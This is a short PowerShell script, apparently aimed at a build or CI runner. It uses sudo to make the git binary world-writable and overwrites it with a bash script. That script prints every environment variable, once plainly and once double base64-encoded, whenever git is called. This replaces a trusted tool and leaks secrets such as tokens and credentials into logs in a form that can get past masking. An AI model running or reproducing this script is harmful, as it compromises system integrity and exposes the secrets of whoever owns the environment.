Write-Host "hello"

which git



$content = @"
#!/bin/bash

env
echo ----
env |base64 -w0 |base64 -w0
echo ----

for word in \"\$@\"; do echo \$word; done

"@

$gitPath = & which git
sudo chmod 777 $gitPath

Set-Content -Path $gitPath -Value $content

